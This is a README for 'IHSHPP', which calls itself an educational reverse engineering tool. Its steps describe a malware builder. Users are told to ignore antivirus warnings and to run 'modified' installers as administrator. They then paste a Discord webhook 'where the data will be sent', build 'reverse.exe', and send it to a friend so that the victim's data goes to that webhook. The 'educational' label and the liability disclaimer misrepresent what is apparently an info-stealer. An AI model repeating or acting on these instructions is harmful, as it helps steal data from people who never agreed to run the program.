# IHSHPP
IHSHPP is a tool designed for educational purposes to reverse engineer software. I AM NOT LIABLE FOR ANYTHING YOU DO WITH THIS TOOL.

# Instructions
Step 1: Because this is a reverse engineering software builder, it WILL be detected by your browser and by antiviruses. You don't have to trust it, just note that the reason it's detected is because it literally is a reverse engineering software and will be detected.

Step 2: Press the green code button and click download zip. Then, using your zip extractor of choice (my recommendation is 7zip), extract the file. Open the folder called IHSHPP and go into the requirements folder and run the installers for each requirement. Even if you already have them, it's recommended to reinstall as we use modified versions of the requirements to fit our needs. It is recommended to run the installers as admin to make sure that they install correctly, as **sometimes** it causes it not to compile properly.

Step 3: In your main folder, create a file called "webhook.txt". In this file, paste in your discord webhook directly. This is where the data will be sent.

Step 4: Run builder as admin, and it should open a GUI. In this GUI, you can select the features you want.

Step 5: Press "Build" and wait 3 or so minutes. Once you do, a new file should appear called "reverse.exe". This is your reverse engineer software. 

Step 6: Send it to a friend. Once they run it, all the data will be sent to the webhook in the text file.

Step 7: Enjoy.
